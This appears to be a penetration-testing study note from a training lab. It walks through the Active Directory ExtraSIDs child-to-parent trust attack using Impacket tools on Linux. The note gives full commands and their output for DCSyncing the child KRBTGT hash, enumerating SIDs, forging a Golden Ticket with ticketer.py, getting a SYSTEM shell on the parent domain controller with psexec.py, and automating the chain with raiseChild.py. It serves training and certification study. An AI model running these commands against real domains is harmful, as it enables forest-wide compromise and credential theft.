> [!card] Impacket — Child → Parent Trust Attack  
> Impacket provides the Linux-side tooling used to gather the required domain information, forge the Golden Ticket, authenticate to the parent domain, and ultimately obtain SYSTEM access.
> 
> > [!code-card] DCSYNC CHILD KRBTGT HASH
> > 
> > ```bash
> > secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
> > ```
> 
> > [!code-card] ENUMERATE CHILD DOMAIN SID
> > 
> > ```bash
> > lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
> > ```
> 
> > [!code-card] FILTER FOR DOMAIN SID
> > 
> > ```bash
> > lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
> > ```
> 
> > [!code-card] FIND PARENT ENTERPRISE ADMINS SID
> > 
> > ```bash
> > lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep -B12 "Enterprise Admins"
> > ```
> 
> > [!code-card] FORGE EXTRASID GOLDEN TICKET
> > 
> > ```bash
> > ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
> > ```
> 
> > [!code-card] USE GENERATED KERBEROS CACHE
> > 
> > ```bash
> > export KRB5CCNAME=hacker.ccache
> > ```
> 
> > [!code-card] AUTHENTICATE TO PARENT DC WITH KERBEROS
> > 
> > ```bash
> > psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
> > ```
> 
> > [!code-card] AUTOMATE CHILD → PARENT ESCALATION
> > 
> > ```bash
> > raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
> > ```

# 🌳 Attacking Domain Trusts — Child → Parent Trusts from Linux

> [!info] Core Idea  
> The Linux workflow performs the same **ExtraSIDs child → parent trust attack** demonstrated from Windows, but uses Impacket tooling to gather the required information, create the Golden Ticket, and authenticate to the parent domain.

The required information remains:

1. **KRBTGT hash** for the child domain
    
2. **Child-domain SID**
    
3. **Target username**
    
4. **Child-domain FQDN**
    
5. **Parent/root-domain Enterprise Admins SID**
    

---

# 🧠 1. Linux Attack Flow

The overall workflow is:

```text
Compromised Child Domain
        │
        ├── secretsdump.py
        │      ↓
        │   Child KRBTGT Hash
        │
        ├── lookupsid.py
        │      ↓
        │   Child Domain SID
        │
        ├── lookupsid.py against Parent DC
        │      ↓
        │   Parent Enterprise Admins SID
        │
        ├── ticketer.py
        │      ↓
        │   Golden Ticket + ExtraSID
        │
        ├── KRB5CCNAME
        │      ↓
        │   Use generated ccache
        │
        └── psexec.py / raiseChild.py
               ↓
        Parent Domain Compromise
```

> [!important] Same Attack, Different Platform  
> The underlying attack is the same as the Windows version:
> 
> **Child KRBTGT + Child SID + Parent Enterprise Admins SID → Golden Ticket with ExtraSID → Parent access**
> 
> What changes is primarily the tooling used to collect the information and construct/use the ticket.

---

# 🔑 2. Obtain the Child KRBTGT Hash with `secretsdump.py`

Once complete control of the child domain has been obtained, the source uses Impacket's `secretsdump.py` to perform DCSync and retrieve the NTLM hash of the child-domain `KRBTGT` account.

```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

The relevant output is:

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
```

> [!success] Important Value  
> **Child KRBTGT NT hash:**
> 
> `9d765b482771505cbe97411065964d5f`

### 🧠 What Changed from the Windows Method?

Previously, the Windows workflow used:

```powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

On Linux, the equivalent workflow uses:

```bash
secretsdump.py ... -just-dc-user LOGISTICS/krbtgt
```

Both are being used to obtain the necessary **KRBTGT secret**.

---

# 🆔 3. Obtain the Child Domain SID

The source next uses Impacket's `lookupsid.py`.

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

The tool performs SID brute forcing against the child-domain DC.

The important output is:

```text
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

It also enumerates RIDs and associated accounts/groups:

```text
500: LOGISTICS\Administrator
501: LOGISTICS\Guest
502: LOGISTICS\krbtgt
512: LOGISTICS\Domain Admins
513: LOGISTICS\Domain Users
...
1001: LOGISTICS\lab_adm
1002: LOGISTICS\ACADEMY-EA-DC02$
1103: LOGISTICS\DnsAdmins
```

> [!important] SID Structure  
> `lookupsid.py` demonstrates that domain SIDs can be combined with RIDs:
> 
> ```text
> DOMAIN-SID + RID = Object SID
> ```
> 
> Example:
> 
> ```text
> S-1-5-21-2806153819-209893948-922872689
> +
> 1001
> =
> S-1-5-21-2806153819-209893948-922872689-1001
> ```

The source specifically uses `lab_adm` as an example.

---

# 🎯 4. Filter the SID Output

Because `lookupsid.py` returns a large amount of information, the source pipes the output into `grep`:

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

Result:

```text
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

> [!tip] Practical Enumeration Habit  
> When a tool produces lots of output, filter for the exact information needed rather than manually scanning the entire result.

---

# 👑 5. Obtain the Parent Enterprise Admins SID

The next step is to query the **parent/root domain controller**.

The source targets:

```text
172.16.5.5
```

and searches for the Enterprise Admins group:

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

The output identifies:

```text
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114

...

518: INLANEFREIGHT\Schema Admins
519: INLANEFREIGHT\Enterprise Admins
```

The important observation is:

```text
Parent Domain SID:
S-1-5-21-3842939050-3880317879-2865463114

Enterprise Admins RID:
519
```

Therefore:

```text
S-1-5-21-3842939050-3880317879-2865463114-519
```

is the **Enterprise Admins group SID**.

> [!important] CPTS Pattern  
> If you know:
> 
> ```text
> Domain SID = S-1-5-21-...
> Group RID  = 519
> ```
> 
> you can construct:
> 
> ```text
> Domain SID + 519
> ```
> 
> to obtain the Enterprise Admins SID demonstrated in this material.

---

# 📦 6. Collect All Required Values

The source now has everything required:

|Value|Data|
|---|---|
|Child KRBTGT hash|`9d765b482771505cbe97411065964d5f`|
|Child domain SID|`S-1-5-21-2806153819-209893948-922872689`|
|Target user|`hacker`|
|Child FQDN|`LOGISTICS.INLANEFREIGHT.LOCAL`|
|Parent Enterprise Admins SID|`S-1-5-21-3842939050-3880317879-2865463114-519`|

> [!tip] Compare with Windows  
> Notice that these are the **same five pieces of information** required by the Windows version.
> 
> The platform changed.
> 
> The attack requirements did not.

---

# 🎫 7. Forge the Golden Ticket with `ticketer.py`

Impacket provides `ticketer.py` for constructing a Golden Ticket.

The source explains that the resulting ticket can be valid for resources in:

- the child domain, specified with `-domain-sid`
    
- the parent domain, represented by `-extra-sid`
    

Command:

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

### 🔍 Command Breakdown

|Option|Purpose|
|---|---|
|`-nthash`|Child-domain KRBTGT NT hash|
|`-domain`|Child-domain FQDN|
|`-domain-sid`|Child-domain SID|
|`-extra-sid`|Parent Enterprise Admins SID|
|`hacker`|Target username represented by the ticket|

The tool creates and signs/encrypts the ticket and saves it as:

```text
hacker.ccache
```

> [!important] Linux Equivalent of `/ptt`  
> In the Windows workflow, Mimikatz/Rubeus used `/ptt` to inject the ticket into the current Windows session.
> 
> Here, the Linux workflow saves the forged ticket as a **ccache file**, which is then selected through `KRB5CCNAME`.

---

# 💾 8. Kerberos Credential Cache — `ccache`

The generated ticket is saved as a **credential cache (`ccache`)** file.

A credential cache stores Kerberos credentials that applications can use for authentication.

The source uses:

```bash
export KRB5CCNAME=hacker.ccache
```

### 🧠 Mental Model

```text
ticketer.py
     ↓
hacker.ccache
     ↓
KRB5CCNAME=hacker.ccache
     ↓
Kerberos-aware Impacket tools
     ↓
Authenticate using forged ticket
```

So:

```bash
export KRB5CCNAME=hacker.ccache
```

essentially tells the environment:

> **"Use this Kerberos credential cache for Kerberos authentication."**

---

# 🖥️ 9. Authenticate to the Parent DC with `psexec.py`

The source then uses Impacket's version of `psexec.py` to authenticate to the parent domain controller using the forged Kerberos ticket.

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

### 🔍 Important Options

|Option|Purpose|
|---|---|
|`-k`|Use Kerberos authentication|
|`-no-pass`|Do not prompt for a password|
|`-target-ip`|Specify the target IP|
|`hacker@...`|Identity being authenticated|

The source shows that `psexec.py`:

1. Requests shares.
    
2. Finds a writable `ADMIN$` share.
    
3. Uploads an executable.
    
4. Opens the Service Control Manager.
    
5. Creates a service.
    
6. Starts the service.
    
7. Provides a command shell.
    

The resulting shell demonstrates:

```text
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
ACADEMY-EA-DC01
```

> [!success] Result  
> The forged ticket was sufficient to authenticate to the parent DC and obtain a **SYSTEM shell**.

---

# ⚡ 10. `raiseChild.py` — Automated Version

Impacket also provides:

```text
raiseChild.py
```

This automates the child → parent escalation process.

Instead of manually collecting each value and constructing the ticket, the script performs the workflow automatically.

Command:

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

---

# 🔬 11. What `raiseChild.py` Does Internally

The source output lets us see the automated workflow.

### Step 1 — Identify Forest

```text
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
```

### Step 2 — Obtain Parent Enterprise Admins SID

```text
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is:
S-1-5-21-3842939050-3880317879-2865463114-519
```

### Step 3 — Obtain Child KRBTGT

```text
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:
...:9d765b482771505cbe97411065964d5f:::
```

### Step 4 — Obtain Parent Credentials

The tool then retrieves parent-domain credentials, including:

```text
INLANEFREIGHT.LOCAL/administrator
```

### Step 5 — Execute on Parent DC

With `-target-exec`, the tool opens a PSEXEC shell on the parent DC:

```text
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares...
[*] Found writable share ADMIN$
[*] Uploading file...
[*] Opening SVCManager...
[*] Creating service...
[*] Starting service...
```

The resulting shell:

```text
C:\Windows\system32>whoami
nt authority\system
```

---

# 🧩 12. Understand `raiseChild.py` as a Workflow

The source includes the script's own workflow description.

### Input

```text
1. Child-domain administrative credentials
2. Optional Golden Ticket output path
3. Optional target-user RID
4. Optional target execution target
```

### Process

```text
1. Locate the child domain controller
2. Identify the forest FQDN
3. Obtain the forest Enterprise Admin SID
4. Obtain child KRBTGT credentials
5. Create a Golden Ticket with the parent SID in ExtraSids
6. Use the ticket to access the forest
7. Optionally save the ticket as ccache
8. Optionally launch PSEXEC
```

### Output

```text
1. Target-user credentials
2. Golden Ticket in ccache format
3. Optional PSEXEC shell
```

---

# 🆚 13. Manual vs Automated Attack

> [!card] Manual Workflow — Best for Understanding  
> Gather every required value yourself and construct the attack step by step.
> 
> > [!code-card] CHILD KRBTGT
> > 
> > ```bash
> > secretsdump.py ... -just-dc-user LOGISTICS/krbtgt
> > ```
> 
> > [!code-card] CHILD SID
> > 
> > ```bash
> > lookupsid.py ...
> > ```
> 
> > [!code-card] PARENT ENTERPRISE ADMINS SID
> > 
> > ```bash
> > lookupsid.py ... | grep -B12 "Enterprise Admins"
> > ```
> 
> > [!code-card] GOLDEN TICKET
> > 
> > ```bash
> > ticketer.py -nthash <KRBTGT> -domain <CHILD> -domain-sid <CHILD-SID> -extra-sid <PARENT-ENTERPRISE-ADMINS-SID> hacker
> > ```
> 
> > [!code-card] USE CCACHE
> > 
> > ```bash
> > export KRB5CCNAME=hacker.ccache
> > ```
> 
> > [!code-card] EXECUTE ON PARENT
> > 
> > ```bash
> > psexec.py <CHILD-DOMAIN>/hacker@<PARENT-DC> -k -no-pass -target-ip <PARENT-IP>
> > ```

> [!card] Automated Workflow — `raiseChild.py`  
> Impacket can automate the entire child → parent escalation chain.
> 
> > [!code-card] AUTOMATE CHILD → PARENT ESCALATION
> > 
> > ```bash
> > raiseChild.py -target-exec <PARENT-DC-IP> <CHILD-DOMAIN>/<CHILD-ADMIN>
> > ```

> [!warning] CPTS / Real Assessment Lesson  
> The source strongly emphasizes understanding the manual process rather than blindly relying on an "autopwn" script. If automation fails, understanding each individual step makes troubleshooting possible.

---

# 🧠 14. Why Manual Understanding Matters

This is one of the most important lessons from the section.

An automated tool may hide the individual operations:

```text
Find child DC
     ↓
Find forest
     ↓
Find Enterprise Admin SID
     ↓
DCSync KRBTGT
     ↓
Forge Golden Ticket
     ↓
Authenticate to parent
     ↓
Retrieve credentials
     ↓
PSEXEC
```

If the automation fails, you need to know **which stage failed**.

For example:

```text
raiseChild.py fails
      ↓
Did KRBTGT retrieval fail?
      ↓
Did SID enumeration fail?
      ↓
Was the Enterprise Admin SID incorrect?
      ↓
Was the ticket creation unsuccessful?
      ↓
Was Kerberos authentication unsuccessful?
      ↓
Did PSEXEC fail?
```

The source explicitly recommends understanding and manually constructing the attack where possible, especially in a production client environment.

> [!warning] Professional Pentesting Lesson  
> **Automation should accelerate understanding, not replace it.**
> 
> If an automated attack chain breaks, you should be able to reproduce the individual stages manually and identify exactly where the problem occurred.

---

# 🔄 15. Windows vs Linux — Same Attack

|Concept|Windows|Linux|
|---|---|---|
|Obtain KRBTGT|`mimikatz lsadump::dcsync`|`secretsdump.py`|
|Find child SID|`Get-DomainSID`|`lookupsid.py`|
|Find parent EA SID|`Get-DomainGroup`|`lookupsid.py`|
|Forge ticket|Mimikatz / Rubeus|`ticketer.py`|
|Ticket delivery|`/ptt`|`KRB5CCNAME` + ccache|
|Verify/use ticket|`klist`|Kerberos-aware Impacket tools|
|Execute remotely|Windows tooling|`psexec.py`|
|Automate|—|`raiseChild.py`|

> [!important] What You Should Actually Memorize  
> Don't memorize two completely separate attacks.
> 
> Memorize the **attack requirements and logic**:
> 
> **KRBTGT → Child SID → Parent EA SID → ExtraSID → Golden Ticket → Parent Authentication**
> 
> Then learn which tools implement each step on Windows and Linux.

---

# 🗺️ 16. CPTS Decision Tree

```text
You have compromised a child domain
              │
              ▼
Can you obtain privileged access?
              │
             YES
              │
              ▼
Obtain child KRBTGT hash
              │
              ▼
Obtain child domain SID
              │
              ▼
Identify parent/root domain
              │
              ▼
Obtain Enterprise Admins SID
              │
              ▼
Forge Golden Ticket with ExtraSID
              │
              ▼
Store/use Kerberos credential
              │
              ├── Linux → hacker.ccache
              │              ↓
              │         KRB5CCNAME
              │
              ▼
Authenticate to parent
              │
              ▼
PSEXEC / other authorized access
              │
              ▼
Parent-domain compromise
```

---

# 🧠 17. Tool Roles

> [!card] `secretsdump.py` — Credential Extraction / DCSync  
> Used here to retrieve the child-domain KRBTGT secret through the DRSUAPI mechanism.
> 
> > [!code-card] GET CHILD KRBTGT
> > 
> > ```bash
> > secretsdump.py <CHILD-DOMAIN>/<USER>@<CHILD-DC> -just-dc-user <CHILD>/krbtgt
> > ```

> [!card] `lookupsid.py` — SID Enumeration  
> Performs SID brute forcing to identify domain SIDs, RIDs, users, and groups.
> 
> > [!code-card] ENUMERATE SIDS
> > 
> > ```bash
> > lookupsid.py <DOMAIN>/<USER>@<DC-IP>
> > ```
> 
> > [!code-card] EXTRACT DOMAIN SID
> > 
> > ```bash
> > lookupsid.py <DOMAIN>/<USER>@<DC-IP> | grep "Domain SID"
> > ```
> 
> > [!code-card] FIND ENTERPRISE ADMINS
> > 
> > ```bash
> > lookupsid.py <DOMAIN>/<USER>@<DC-IP> | grep -B12 "Enterprise Admins"
> > ```

> [!card] `ticketer.py` — Kerberos Golden Ticket Creation  
> Constructs a Golden Ticket using the child KRBTGT hash and can include the parent Enterprise Admins SID as an ExtraSID.
> 
> > [!code-card] CREATE EXTRASID GOLDEN TICKET
> > 
> > ```bash
> > ticketer.py -nthash <KRBTGT-HASH> -domain <CHILD-FQDN> -domain-sid <CHILD-SID> -extra-sid <PARENT-ENTERPRISE-ADMINS-SID> hacker
> > ```

> [!card] `KRB5CCNAME` — Kerberos Credential Selection  
> Selects the ccache file to use for Kerberos authentication.
> 
> > [!code-card] SELECT FORGED CREDENTIAL CACHE
> > 
> > ```bash
> > export KRB5CCNAME=hacker.ccache
> > ```

> [!card] `psexec.py` — Remote Service Execution  
> Uses SMB/service creation to obtain a remote command shell when sufficient privileges are available.
> 
> > [!code-card] AUTHENTICATE WITH KERBEROS
> > 
> > ```bash
> > psexec.py <DOMAIN>/hacker@<PARENT-DC> -k -no-pass -target-ip <PARENT-IP>
> > ```

> [!card] `raiseChild.py` — Automated Child → Parent Escalation  
> Automates the major stages of the child-to-parent ExtraSIDs attack.
> 
> > [!code-card] AUTOMATE CHILD → PARENT ATTACK
> > 
> > ```bash
> > raiseChild.py -target-exec <PARENT-IP> <CHILD-FQDN>/<CHILD-ADMIN>
> > ```

---

# 🎯 18. Exam-Level Mental Model

> [!important] If You Remember Only One Thing  
> When you obtain **high privileges in an AD child domain**, don't think only about the child domain.
> 
> Think about the **forest**.
> 
> ```text
> CHILD COMPROMISED
>       ↓
> KRBTGT HASH
>       +
> CHILD SID
>       +
> PARENT ENTERPRISE ADMINS SID
>       ↓
> EXTRA SID
>       ↓
> GOLDEN TICKET
>       ↓
> PARENT DOMAIN
>       ↓
> DOMAIN / FOREST COMPROMISE
> ```

---

# 📝 19. Key Takeaways

> [!success] Remember
> 
> - The Linux workflow performs the same ExtraSIDs attack as the Windows workflow.
>     
> - `secretsdump.py` can be used to DCSync the child-domain `KRBTGT` account.
>     
> - `lookupsid.py` can identify domain SIDs and associated RIDs.
>     
> - The parent Enterprise Admins SID can be identified by querying the parent DC.
>     
> - Enterprise Admins has RID `519` in the material.
>     
> - `ticketer.py` creates the Golden Ticket on Linux.
>     
> - `-domain-sid` identifies the child domain.
>     
> - `-extra-sid` adds the parent Enterprise Admins SID.
>     
> - The generated ticket is stored as a `.ccache` file.
>     
> - `KRB5CCNAME` tells Kerberos-aware applications which credential cache to use.
>     
> - `psexec.py -k -no-pass` can use the forged Kerberos authentication without supplying a password.
>     
> - `raiseChild.py` automates the entire child → parent workflow.
>     
> - Understanding the manual process is essential for troubleshooting.
>     
> - Avoid blindly relying on "autopwn" tooling in real client environments.
>     
> - The core attack logic is the same regardless of whether the attack host is Windows or Linux.
>     

> [!warning] Professional Mindset  
> **Know the attack chain before automating it.**
> 
> In a CPTS assessment, tools such as `raiseChild.py` can save time, but understanding what they do underneath is what allows you to recognize, troubleshoot, and adapt the attack when the environment differs from the lab.